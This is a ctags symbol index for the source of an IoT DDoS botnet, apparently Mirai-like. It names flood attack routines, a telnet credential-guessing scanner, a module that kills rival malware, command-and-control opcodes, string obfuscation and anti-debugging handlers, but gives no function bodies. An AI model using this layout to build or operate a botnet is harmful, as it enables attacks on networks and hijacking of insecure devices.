!_TAG_FILE_FORMAT	2	/extended format; --format=1 will not append ;" to lines/
!_TAG_FILE_SORTED	1	/0=unsorted, 1=sorted, 2=foldcase/
!_TAG_PROGRAM_AUTHOR	Darren Hiebert	/dhiebert@users.sourceforge.net/
!_TAG_PROGRAM_NAME	Exuberant Ctags	//
!_TAG_PROGRAM_URL	http://ctags.sourceforge.net	/official site/
!_TAG_PROGRAM_VERSION	5.9~svn20110310	//
ATK_OPT_ACK	./attack.h	58;"	d
ATK_OPT_ACKRND	./attack.h	64;"	d
ATK_OPT_CONNS	./attack.h	70;"	d
ATK_OPT_DNS_HDR_ID	./attack.h	55;"	d
ATK_OPT_DOMAIN	./attack.h	54;"	d
ATK_OPT_DPORT	./attack.h	53;"	d
ATK_OPT_FIN	./attack.h	62;"	d
ATK_OPT_GRE_CONSTIP	./attack.h	65;"	d
ATK_OPT_HTTPS	./attack.h	69;"	d
ATK_OPT_IP_DF	./attack.h	51;"	d
ATK_OPT_IP_IDENT	./attack.h	49;"	d
ATK_OPT_IP_TOS	./attack.h	48;"	d
ATK_OPT_IP_TTL	./attack.h	50;"	d
ATK_OPT_METHOD	./attack.h	66;"	d
ATK_OPT_PATH	./attack.h	68;"	d
ATK_OPT_PAYLOAD_RAND	./attack.h	47;"	d
ATK_OPT_PAYLOAD_SIZE	./attack.h	46;"	d
ATK_OPT_POST_DATA	./attack.h	67;"	d
ATK_OPT_PSH	./attack.h	59;"	d
ATK_OPT_RST	./attack.h	60;"	d
ATK_OPT_SEQRND	./attack.h	63;"	d
ATK_OPT_SOURCE	./attack.h	71;"	d
ATK_OPT_SPORT	./attack.h	52;"	d
ATK_OPT_SYN	./attack.h	61;"	d
ATK_OPT_URG	./attack.h	57;"	d
ATK_VEC_ACK	./attack.h	38;"	d
ATK_VEC_DNS	./attack.h	36;"	d
ATK_VEC_GREETH	./attack.h	41;"	d
ATK_VEC_GREIP	./attack.h	40;"	d
ATK_VEC_HTTP	./attack.h	44;"	d
ATK_VEC_STOMP	./attack.h	39;"	d
ATK_VEC_SYN	./attack.h	37;"	d
ATK_VEC_UDP	./attack.h	34;"	d
ATK_VEC_UDP_PLAIN	./attack.h	43;"	d
ATK_VEC_VSE	./attack.h	35;"	d
ATTACK_CONCURRENT_MAX	./attack.h	12;"	d
ATTACK_FUNC	./attack.h	/^typedef void (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *);$/;"	t
ATTACK_VECTOR	./attack.h	/^typedef uint8_t ATTACK_VECTOR;$/;"	t
BOOL	./includes.h	/^typedef char BOOL;$/;"	t
CNC_OP_ATTACK	./includes.h	31;"	d
CNC_OP_KILLATTKS	./includes.h	29;"	d
CNC_OP_KILLSELF	./includes.h	28;"	d
CNC_OP_PING	./includes.h	27;"	d
CNC_OP_PROXY	./includes.h	30;"	d
FAKE_CNC_ADDR	./includes.h	24;"	d
FAKE_CNC_PORT	./includes.h	25;"	d
FALSE	./includes.h	12;"	d
HTTP_CONNECTION_MAX	./attack.h	15;"	d
HTTP_CONNECTION_MAX	./attack.h	17;"	d
HTTP_CONN_CLOSED	./attack.h	95;"	d
HTTP_CONN_CONNECTING	./attack.h	86;"	d
HTTP_CONN_HTTPS_STUFF	./attack.h	87;"	d
HTTP_CONN_INIT	./attack.h	84;"	d
HTTP_CONN_QUEUE_RESTART	./attack.h	94;"	d
HTTP_CONN_RECV_BODY	./attack.h	91;"	d
HTTP_CONN_RECV_HEADER	./attack.h	90;"	d
HTTP_CONN_RESTART	./attack.h	85;"	d
HTTP_CONN_SEND	./attack.h	88;"	d
HTTP_CONN_SEND_HEADERS	./attack.h	89;"	d
HTTP_CONN_SEND_JUNK	./attack.h	92;"	d
HTTP_CONN_SNDBUF_WAIT	./attack.h	93;"	d
HTTP_COOKIE_LEN_MAX	./attack.h	102;"	d
HTTP_COOKIE_MAX	./attack.h	101;"	d
HTTP_DOMAIN_MAX	./attack.h	100;"	d
HTTP_HACK_DRAIN	./attack.h	98;"	d
HTTP_PATH_MAX	./attack.h	99;"	d
HTTP_POST_MAX	./attack.h	103;"	d
HTTP_PROT_CLOUDFLARE	./attack.h	106;"	d
HTTP_PROT_DOSARREST	./attack.h	105;"	d
HTTP_RDBUF_SIZE	./attack.h	97;"	d
INET_ADDR	./includes.h	19;"	d
KILLER_MIN_PID	./killer.h	5;"	d
KILLER_REBIND_TELNET	./killer.h	8;"	d
KILLER_RESTART_SCAN_TIME	./killer.h	6;"	d
LOCAL_ADDR	./includes.h	/^ipv4_t LOCAL_ADDR;$/;"	v
PHI	./rand.h	5;"	d
PROTO_DNS_QCLASS_IP	./protocol.h	26;"	d
PROTO_DNS_QTYPE_A	./protocol.h	25;"	d
PROTO_GRE_TRANS_ETH	./protocol.h	34;"	d
PROTO_TCP_OPT_MSS	./protocol.h	29;"	d
PROTO_TCP_OPT_NOP	./protocol.h	28;"	d
PROTO_TCP_OPT_SACK	./protocol.h	31;"	d
PROTO_TCP_OPT_TSVAL	./protocol.h	32;"	d
PROTO_TCP_OPT_WSS	./protocol.h	30;"	d
SCANNER_HACK_DRAIN	./scanner.h	16;"	d
SCANNER_MAX_CONNS	./scanner.h	11;"	d
SCANNER_MAX_CONNS	./scanner.h	8;"	d
SCANNER_RAW_PPS	./scanner.h	12;"	d
SCANNER_RAW_PPS	./scanner.h	9;"	d
SCANNER_RDBUF_SIZE	./scanner.h	15;"	d
SC_CLOSED	./scanner.h	/^        SC_CLOSED,$/;"	e	enum:scanner_connection::__anon1
SC_CONNECTING	./scanner.h	/^        SC_CONNECTING,$/;"	e	enum:scanner_connection::__anon1
SC_HANDLE_IACS	./scanner.h	/^        SC_HANDLE_IACS,$/;"	e	enum:scanner_connection::__anon1
SC_WAITING_ENABLE_RESP	./scanner.h	/^        SC_WAITING_ENABLE_RESP,$/;"	e	enum:scanner_connection::__anon1
SC_WAITING_PASSWD_RESP	./scanner.h	/^        SC_WAITING_PASSWD_RESP,$/;"	e	enum:scanner_connection::__anon1
SC_WAITING_PASSWORD	./scanner.h	/^        SC_WAITING_PASSWORD,$/;"	e	enum:scanner_connection::__anon1
SC_WAITING_SHELL_RESP	./scanner.h	/^        SC_WAITING_SHELL_RESP,$/;"	e	enum:scanner_connection::__anon1
SC_WAITING_SH_RESP	./scanner.h	/^        SC_WAITING_SH_RESP,$/;"	e	enum:scanner_connection::__anon1
SC_WAITING_SYSTEM_RESP	./scanner.h	/^        SC_WAITING_SYSTEM_RESP,$/;"	e	enum:scanner_connection::__anon1
SC_WAITING_TOKEN_RESP	./scanner.h	/^        SC_WAITING_TOKEN_RESP$/;"	e	enum:scanner_connection::__anon1
SC_WAITING_USERNAME	./scanner.h	/^        SC_WAITING_USERNAME,$/;"	e	enum:scanner_connection::__anon1
SINGLE_INSTANCE_PORT	./includes.h	21;"	d
STDERR	./includes.h	10;"	d
STDIN	./includes.h	8;"	d
STDOUT	./includes.h	9;"	d
TABLE_ATK_ACCEPT	./table.h	54;"	d
TABLE_ATK_ACCEPT_LNG	./table.h	55;"	d
TABLE_ATK_CHUNKED	./table.h	63;"	d
TABLE_ATK_CLOUDFLARE_NGINX	./table.h	67;"	d
TABLE_ATK_CONNECTION_HDR	./table.h	65;"	d
TABLE_ATK_CONTENT_LENGTH_HDR	./table.h	61;"	d
TABLE_ATK_CONTENT_TYPE	./table.h	56;"	d
TABLE_ATK_DOSARREST	./table.h	66;"	d
TABLE_ATK_KEEP_ALIVE	./table.h	53;"	d
TABLE_ATK_KEEP_ALIVE_HDR	./table.h	64;"	d
TABLE_ATK_LOCATION_HDR	./table.h	59;"	d
TABLE_ATK_NSERV	./table.h	51;"	d
TABLE_ATK_REFRESH_HDR	./table.h	58;"	d
TABLE_ATK_RESOLVER	./table.h	50;"	d
TABLE_ATK_SET_COOKIE	./table.h	57;"	d
TABLE_ATK_SET_COOKIE_HDR	./table.h	60;"	d
TABLE_ATK_TRANSFER_ENCODING_HDR	./table.h	62;"	d
TABLE_ATK_VSE	./table.h	49;"	d
TABLE_CNC_DOMAIN	./table.h	17;"	d
TABLE_CNC_PORT	./table.h	18;"	d
TABLE_EXEC_SUCCESS	./table.h	16;"	d
TABLE_HTTP_FIVE	./table.h	74;"	d
TABLE_HTTP_FOUR	./table.h	73;"	d
TABLE_HTTP_ONE	./table.h	70;"	d
TABLE_HTTP_THREE	./table.h	72;"	d
TABLE_HTTP_TWO	./table.h	71;"	d
TABLE_KILLER_ANIME	./table.h	26;"	d
TABLE_KILLER_DELETED	./table.h	24;"	d
TABLE_KILLER_EXE	./table.h	23;"	d
TABLE_KILLER_FD	./table.h	25;"	d
TABLE_KILLER_PROC	./table.h	22;"	d
TABLE_KILLER_SAFE	./table.h	21;"	d
TABLE_KILLER_STATUS	./table.h	27;"	d
TABLE_MAX_KEYS	./table.h	76;"	d
TABLE_MEM_QBOT	./table.h	28;"	d
TABLE_MEM_QBOT2	./table.h	29;"	d
TABLE_MEM_QBOT3	./table.h	30;"	d
TABLE_MEM_REMAITEN	./table.h	33;"	d
TABLE_MEM_UPX	./table.h	31;"	d
TABLE_MEM_ZOLLARD	./table.h	32;"	d
TABLE_PROCESS_ARGV	./table.h	15;"	d
TABLE_SCAN_CB_DOMAIN	./table.h	36;"	d
TABLE_SCAN_CB_PORT	./table.h	37;"	d
TABLE_SCAN_ENABLE	./table.h	39;"	d
TABLE_SCAN_KILL_9	./table.h	46;"	d
TABLE_SCAN_NCORRECT	./table.h	44;"	d
TABLE_SCAN_PS	./table.h	45;"	d
TABLE_SCAN_QUERY	./table.h	42;"	d
TABLE_SCAN_RESP	./table.h	43;"	d
TABLE_SCAN_SH	./table.h	41;"	d
TABLE_SCAN_SHELL	./table.h	38;"	d
TABLE_SCAN_SYSTEM	./table.h	40;"	d
TRUE	./includes.h	13;"	d
_GNU_SOURCE	./attack.c	1;"	d	file:
_GNU_SOURCE	./attack_app.c	1;"	d	file:
_GNU_SOURCE	./attack_gre.c	1;"	d	file:
_GNU_SOURCE	./attack_tcp.c	1;"	d	file:
_GNU_SOURCE	./attack_udp.c	1;"	d	file:
_GNU_SOURCE	./checksum.c	1;"	d	file:
_GNU_SOURCE	./killer.c	1;"	d	file:
_GNU_SOURCE	./main.c	1;"	d	file:
_GNU_SOURCE	./rand.c	1;"	d	file:
_GNU_SOURCE	./resolv.c	1;"	d	file:
_GNU_SOURCE	./scanner.c	1;"	d	file:
_GNU_SOURCE	./table.c	1;"	d	file:
_GNU_SOURCE	./util.c	1;"	d	file:
_class	./protocol.h	/^    uint16_t type, _class;$/;"	m	struct:dns_resource
ack_seq	./attack.h	/^    uint32_t seq, ack_seq;$/;"	m	struct:attack_stomp_data
add_attack	./attack.c	/^static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)$/;"	f	file:
add_auth_entry	./scanner.c	/^static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)$/;"	f	file:
add_entry	./table.c	/^static void add_entry(uint8_t id, char *buf, int buf_len)$/;"	f	file:
addr	./attack.h	/^    ipv4_t addr;$/;"	m	struct:attack_stomp_data
addr	./attack.h	/^    ipv4_t addr;$/;"	m	struct:attack_target
addrs	./resolv.h	/^    ipv4_t *addrs;$/;"	m	struct:resolv_entries
addrs_len	./resolv.h	/^    uint8_t addrs_len;$/;"	m	struct:resolv_entries
ancount	./protocol.h	/^    uint16_t id, opts, qdcount, ancount, nscount, arcount;$/;"	m	struct:dnshdr
anti_gdb_entry	./main.c	/^static void anti_gdb_entry(int sig)$/;"	f	file:
arcount	./protocol.h	/^    uint16_t id, opts, qdcount, ancount, nscount, arcount;$/;"	m	struct:dnshdr
attack_app_cfnull	./attack_app.c	/^void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)$/;"	f
attack_app_http	./attack_app.c	/^void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)$/;"	f
attack_app_proxy	./attack_app.c	/^void attack_app_proxy(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)$/;"	f
attack_cfnull_state	./attack.h	/^struct attack_cfnull_state {$/;"	s
attack_get_opt_int	./attack.c	/^int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)$/;"	f
attack_get_opt_ip	./attack.c	/^uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)$/;"	f
attack_get_opt_str	./attack.c	/^char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)$/;"	f
attack_gre_eth	./attack_gre.c	/^void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)$/;"	f
attack_gre_ip	./attack_gre.c	/^void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)$/;"	f
attack_http_state	./attack.h	/^struct attack_http_state {$/;"	s
attack_init	./attack.c	/^BOOL attack_init(void)$/;"	f
attack_kill_all	./attack.c	/^void attack_kill_all(void)$/;"	f
attack_method	./attack.h	/^struct attack_method {$/;"	s
attack_ongoing	./attack.c	/^int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};$/;"	v
attack_option	./attack.h	/^struct attack_option {$/;"	s
attack_parse	./attack.c	/^void attack_parse(char *buf, int len)$/;"	f
attack_start	./attack.c	/^void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)$/;"	f
attack_stomp_data	./attack.h	/^struct attack_stomp_data {$/;"	s
attack_target	./attack.h	/^struct attack_target {$/;"	s
attack_tcp_ack	./attack_tcp.c	/^void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)$/;"	f
attack_tcp_stomp	./attack_tcp.c	/^void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)$/;"	f
attack_tcp_syn	./attack_tcp.c	/^void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)$/;"	f
attack_udp_dns	./attack_udp.c	/^void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)$/;"	f
attack_udp_generic	./attack_udp.c	/^void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)$/;"	f
attack_udp_plain	./attack_udp.c	/^void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)$/;"	f
attack_udp_vse	./attack_udp.c	/^void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)$/;"	f
auth	./scanner.h	/^    struct scanner_auth *auth;$/;"	m	struct:scanner_connection	typeref:struct:scanner_connection::scanner_auth
auth_table	./scanner.c	/^struct scanner_auth *auth_table = NULL;$/;"	v	typeref:struct:scanner_auth
auth_table_len	./scanner.c	/^int scanner_pid, rsck, rsck_out, auth_table_len = 0;$/;"	v
auth_table_max_weight	./scanner.c	/^uint16_t auth_table_max_weight = 0;$/;"	v
can_consume	./scanner.c	/^static BOOL can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount)$/;"	f	file:
checksum_generic	./checksum.c	/^uint16_t checksum_generic(uint16_t *addr, uint32_t count)$/;"	f
checksum_tcpudp	./checksum.c	/^uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)$/;"	f
chunked	./attack.h	/^    int chunked;$/;"	m	struct:attack_http_state
conn_table	./scanner.c	/^struct scanner_connection *conn_table;$/;"	v	typeref:struct:scanner_connection
consume_any_prompt	./scanner.c	/^static int consume_any_prompt(struct scanner_connection *conn)$/;"	f	file:
consume_iacs	./scanner.c	/^static int consume_iacs(struct scanner_connection *conn)$/;"	f	file:
consume_pass_prompt	./scanner.c	/^static int consume_pass_prompt(struct scanner_connection *conn)$/;"	f	file:
consume_resp_prompt	./scanner.c	/^static int consume_resp_prompt(struct scanner_connection *conn)$/;"	f	file:
consume_user_prompt	./scanner.c	/^static int consume_user_prompt(struct scanner_connection *conn)$/;"	f	file:
content_length	./attack.h	/^    int content_length;$/;"	m	struct:attack_http_state
cookies	./attack.h	/^    char cookies[HTTP_COOKIE_MAX][HTTP_COOKIE_LEN_MAX];$/;"	m	struct:attack_http_state
data_len	./protocol.h	/^    uint16_t data_len;$/;"	m	struct:dns_resource
deobf	./scanner.c	/^static char *deobf(char *str, int *len)$/;"	f	file:
dns_question	./protocol.h	/^struct dns_question {$/;"	s
dns_resource	./protocol.h	/^struct dns_resource {$/;"	s
dnshdr	./protocol.h	/^struct dnshdr {$/;"	s
domain	./attack.h	/^    char domain[HTTP_DOMAIN_MAX + 1];$/;"	m	struct:attack_cfnull_state
domain	./attack.h	/^    char domain[HTTP_DOMAIN_MAX + 1];$/;"	m	struct:attack_http_state
dport	./attack.h	/^    port_t sport, dport;$/;"	m	struct:attack_stomp_data
dst_addr	./attack.h	/^    ipv4_t dst_addr;$/;"	m	struct:attack_cfnull_state
dst_addr	./attack.h	/^    ipv4_t dst_addr;$/;"	m	struct:attack_http_state
dst_addr	./scanner.h	/^    ipv4_t dst_addr;$/;"	m	struct:scanner_connection
dst_port	./scanner.h	/^    uint16_t dst_port;$/;"	m	struct:scanner_connection
ensure_single_instance	./main.c	/^static void ensure_single_instance(void)$/;"	f	file:
establish_connection	./main.c	/^static void establish_connection(void)$/;"	f	file:
fake_time	./scanner.c	/^uint32_t fake_time = 0;$/;"	v
fd	./attack.h	/^    int fd;$/;"	m	struct:attack_cfnull_state
fd	./attack.h	/^    int fd;$/;"	m	struct:attack_http_state
fd	./scanner.h	/^    int fd, last_recv;$/;"	m	struct:scanner_connection
fd_ctrl	./main.c	/^int fd_ctrl = -1, fd_serv = -1;$/;"	v
fd_serv	./main.c	/^int fd_ctrl = -1, fd_serv = -1;$/;"	v
free_opts	./attack.c	/^static void free_opts(struct attack_option *opts, int len)$/;"	f	file:
func	./attack.h	/^    ATTACK_FUNC func;$/;"	m	struct:attack_method
get_dns_resolver	./attack_udp.c	/^static ipv4_t get_dns_resolver(void)$/;"	f	file:
get_random_ip	./scanner.c	/^static ipv4_t get_random_ip(void)$/;"	f	file:
grehdr	./protocol.h	/^struct grehdr {$/;"	s
has_exe_access	./killer.c	/^static BOOL has_exe_access(void)$/;"	f	file:
id	./protocol.h	/^    uint16_t id, opts, qdcount, ancount, nscount, arcount;$/;"	m	struct:dnshdr
ipv4_t	./includes.h	/^typedef uint32_t ipv4_t;$/;"	t
keepalive	./attack.h	/^    int keepalive;$/;"	m	struct:attack_http_state
key	./attack.h	/^    uint8_t key;$/;"	m	struct:attack_option
killer_init	./killer.c	/^void killer_init(void)$/;"	f
killer_kill	./killer.c	/^void killer_kill(void)$/;"	f
killer_kill_by_port	./killer.c	/^BOOL killer_kill_by_port(port_t port)$/;"	f
killer_pid	./killer.c	/^int killer_pid;$/;"	v
killer_realpath	./killer.c	/^char *killer_realpath;$/;"	v
killer_realpath_len	./killer.c	/^int killer_realpath_len = 0;$/;"	v
last_recv	./attack.h	/^    int last_recv;$/;"	m	struct:attack_cfnull_state
last_recv	./attack.h	/^    int last_recv;$/;"	m	struct:attack_http_state
last_recv	./scanner.h	/^    int fd, last_recv;$/;"	m	struct:scanner_connection
last_send	./attack.h	/^    int last_send;$/;"	m	struct:attack_cfnull_state
last_send	./attack.h	/^    int last_send;$/;"	m	struct:attack_http_state
locked	./table.h	/^    BOOL locked;$/;"	m	struct:table_value
main	./main.c	/^int main(int argc, char **args)$/;"	f
mem_exists	./killer.c	/^static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)$/;"	f	file:
memory_scan_match	./killer.c	/^static BOOL memory_scan_match(char *path)$/;"	f	file:
method	./attack.h	/^    char method[9];$/;"	m	struct:attack_http_state
methods	./attack.c	/^struct attack_method **methods = NULL;$/;"	v	typeref:struct:attack_method
methods_len	./attack.c	/^uint8_t methods_len = 0;$/;"	v
netmask	./attack.h	/^    uint8_t netmask;$/;"	m	struct:attack_target
nscount	./protocol.h	/^    uint16_t id, opts, qdcount, ancount, nscount, arcount;$/;"	m	struct:dnshdr
num_cookies	./attack.h	/^    int num_cookies;$/;"	m	struct:attack_http_state
opts	./protocol.h	/^    uint16_t id, opts, qdcount, ancount, nscount, arcount;$/;"	m	struct:dnshdr
opts	./protocol.h	/^    uint16_t opts, protocol;$/;"	m	struct:grehdr
orig_method	./attack.h	/^    char orig_method[9];$/;"	m	struct:attack_http_state
outptr	./includes.h	/^static char *outptr;$/;"	v
password	./scanner.h	/^    char *password;$/;"	m	struct:scanner_auth
password_len	./scanner.h	/^    uint8_t username_len, password_len;$/;"	m	struct:scanner_auth
path	./attack.h	/^    char path[HTTP_PATH_MAX + 1];$/;"	m	struct:attack_http_state
pending_connection	./main.c	/^BOOL pending_connection = FALSE;$/;"	v
port_t	./includes.h	/^typedef uint16_t port_t;$/;"	t
postdata	./attack.h	/^    char postdata[HTTP_POST_MAX + 1];$/;"	m	struct:attack_http_state
printf	./includes.h	132;"	d
protection_type	./attack.h	/^    int protection_type;$/;"	m	struct:attack_http_state
protocol	./protocol.h	/^    uint16_t opts, protocol;$/;"	m	struct:grehdr
qclass	./protocol.h	/^    uint16_t qtype, qclass;$/;"	m	struct:dns_question
qdcount	./protocol.h	/^    uint16_t id, opts, qdcount, ancount, nscount, arcount;$/;"	m	struct:dnshdr
qtype	./protocol.h	/^    uint16_t qtype, qclass;$/;"	m	struct:dns_question
rand_alphastr	./rand.c	/^void rand_alphastr(uint8_t *str, int len) \/\/ Random alphanumeric string, more expensive than rand_str$/;"	f
rand_init	./rand.c	/^void rand_init(void)$/;"	f
rand_next	./rand.c	/^uint32_t rand_next(void) \/\/period 2^96-1$/;"	f
rand_str	./rand.c	/^void rand_str(char *str, int len) \/\/ Generate random buffer (not alphanumeric!) of length len$/;"	f
random_auth_entry	./scanner.c	/^static struct scanner_auth *random_auth_entry(void)$/;"	f	file:
rdbuf	./attack.h	/^    char rdbuf[HTTP_RDBUF_SIZE];$/;"	m	struct:attack_http_state
rdbuf	./scanner.h	/^    char rdbuf[SCANNER_RDBUF_SIZE];$/;"	m	struct:scanner_connection
rdbuf_pos	./attack.h	/^    int rdbuf_pos;$/;"	m	struct:attack_http_state
rdbuf_pos	./scanner.h	/^    int rdbuf_pos;$/;"	m	struct:scanner_connection
recv_strip_null	./scanner.c	/^int recv_strip_null(int sock, void *buf, int len, int flags)$/;"	f
report_working	./scanner.c	/^static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)$/;"	f	file:
resolv_domain_to_hostname	./resolv.c	/^void resolv_domain_to_hostname(char *dst_hostname, char *src_domain)$/;"	f
resolv_entries	./resolv.h	/^struct resolv_entries {$/;"	s
resolv_entries_free	./resolv.c	/^void resolv_entries_free(struct resolv_entries *entries)$/;"	f
resolv_lookup	./resolv.c	/^struct resolv_entries *resolv_lookup(char *domain)$/;"	f
resolv_skip_name	./resolv.c	/^static void resolv_skip_name(uint8_t *reader, uint8_t *buffer, int *count)$/;"	f	file:
resolve_cnc_addr	./main.c	/^static void resolve_cnc_addr(void)$/;"	f	file:
resolve_func	./main.c	/^void (*resolve_func)(void) = (void (*)(void))util_local_addr; \/\/ Overridden in anti_gdb_entry$/;"	v
rsck	./scanner.c	/^int scanner_pid, rsck, rsck_out, auth_table_len = 0;$/;"	v
rsck_out	./scanner.c	/^int scanner_pid, rsck, rsck_out, auth_table_len = 0;$/;"	v
scanner_auth	./scanner.h	/^struct scanner_auth {$/;"	s
scanner_connection	./scanner.h	/^struct scanner_connection {$/;"	s
scanner_init	./scanner.c	/^void scanner_init(void)$/;"	f
scanner_kill	./scanner.c	/^void scanner_kill(void)$/;"	f
scanner_pid	./scanner.c	/^int scanner_pid, rsck, rsck_out, auth_table_len = 0;$/;"	v
scanner_rawpkt	./scanner.c	/^char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};$/;"	v
segv_handler	./main.c	/^static void segv_handler(int sig, siginfo_t *si, void *unused)$/;"	f	file:
segv_handler_2	./main.c	/^static void segv_handler_2(int sig, siginfo_t *si, void *unused)$/;"	f	file:
seq	./attack.h	/^    uint32_t seq, ack_seq;$/;"	m	struct:attack_stomp_data
setup_connection	./scanner.c	/^static void setup_connection(struct scanner_connection *conn)$/;"	f	file:
sock_addr	./attack.h	/^    struct sockaddr_in sock_addr;$/;"	m	struct:attack_target	typeref:struct:attack_target::sockaddr_in
sport	./attack.h	/^    port_t sport, dport;$/;"	m	struct:attack_stomp_data
srv_addr	./main.c	/^struct sockaddr_in srv_addr;$/;"	v	typeref:struct:sockaddr_in
state	./attack.h	/^    uint8_t state;$/;"	m	struct:attack_cfnull_state
state	./attack.h	/^    uint8_t state;$/;"	m	struct:attack_http_state
state	./scanner.h	/^    } state;$/;"	m	struct:scanner_connection	typeref:enum:scanner_connection::__anon1
table	./table.c	/^struct table_value table[TABLE_MAX_KEYS];$/;"	v	typeref:struct:table_value
table_init	./table.c	/^void table_init(void)$/;"	f
table_key	./table.c	/^uint32_t table_key = 0xdeadbeef;$/;"	v
table_lock_val	./table.c	/^void table_lock_val(uint8_t id)$/;"	f
table_retrieve_val	./table.c	/^char *table_retrieve_val(int id, int *len)$/;"	f
table_unlock_val	./table.c	/^void table_unlock_val(uint8_t id)$/;"	f
table_value	./table.h	/^struct table_value {$/;"	s
teardown_connection	./main.c	/^static void teardown_connection(void)$/;"	f	file:
to_send	./attack.h	/^    int to_send;$/;"	m	struct:attack_cfnull_state
toggle_obf	./table.c	/^static void toggle_obf(uint8_t id)$/;"	f	file:
tries	./scanner.h	/^    uint8_t tries;$/;"	m	struct:scanner_connection
ttl	./protocol.h	/^    uint32_t ttl;$/;"	m	struct:dns_resource
type	./protocol.h	/^    uint16_t type, _class;$/;"	m	struct:dns_resource
unlock_tbl_if_nodebug	./main.c	/^static BOOL unlock_tbl_if_nodebug(char *argv0)$/;"	f	file:
user_agent	./attack.h	/^    char user_agent[512];$/;"	m	struct:attack_cfnull_state
user_agent	./attack.h	/^    char user_agent[512];$/;"	m	struct:attack_http_state
username	./scanner.h	/^    char *username;$/;"	m	struct:scanner_auth
username_len	./scanner.h	/^    uint8_t username_len, password_len;$/;"	m	struct:scanner_auth
util_atoi	./util.c	/^int util_atoi(char *str, int base)$/;"	f
util_fdgets	./util.c	/^char *util_fdgets(char *buffer, int buffer_size, int fd)$/;"	f
util_isalpha	./util.c	/^static inline int util_isalpha(char c)$/;"	f	file:
util_isdigit	./util.c	/^static inline int util_isdigit(char c)$/;"	f	file:
util_isspace	./util.c	/^static inline int util_isspace(char c)$/;"	f	file:
util_isupper	./util.c	/^static inline int util_isupper(char c)$/;"	f	file:
util_itoa	./util.c	/^char *util_itoa(int value, int radix, char *string)$/;"	f
util_local_addr	./util.c	/^ipv4_t util_local_addr(void)$/;"	f
util_memcpy	./util.c	/^void util_memcpy(void *dst, void *src, int len)$/;"	f
util_memsearch	./util.c	/^int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)$/;"	f
util_strcmp	./util.c	/^BOOL util_strcmp(char *str1, char *str2)$/;"	f
util_strcpy	./util.c	/^int util_strcpy(char *dst, char *src)$/;"	f
util_stristr	./util.c	/^int util_stristr(char *haystack, int haystack_len, char *str)$/;"	f
util_strlen	./util.c	/^int util_strlen(char *str)$/;"	f
util_strncmp	./util.c	/^BOOL util_strncmp(char *str1, char *str2, int len)$/;"	f
util_zero	./util.c	/^void util_zero(void *buf, int len)$/;"	f
val	./attack.h	/^    char *val;$/;"	m	struct:attack_option
val	./table.h	/^    char *val;$/;"	m	struct:table_value
val_len	./table.h	/^    uint16_t val_len;$/;"	m	struct:table_value
vector	./attack.h	/^    ATTACK_VECTOR vector;$/;"	m	struct:attack_method
w	./rand.c	/^static uint32_t x, y, z, w;$/;"	v	file:
weight_max	./scanner.h	/^    uint16_t weight_min, weight_max;$/;"	m	struct:scanner_auth
weight_min	./scanner.h	/^    uint16_t weight_min, weight_max;$/;"	m	struct:scanner_auth
x	./rand.c	/^static uint32_t x, y, z, w;$/;"	v	file:
xprintf	./includes.h	/^static void xprintf(const char *fmt, ...)$/;"	f
xputc	./includes.h	/^static void xputc(char c)$/;"	f
xputs	./includes.h	/^static void xputs(const char *str)$/;"	f
xvprintf	./includes.h	/^static void xvprintf(const char *fmt, va_list arp)$/;"	f
y	./rand.c	/^static uint32_t x, y, z, w;$/;"	v	file:
z	./rand.c	/^static uint32_t x, y, z, w;$/;"	v	file:
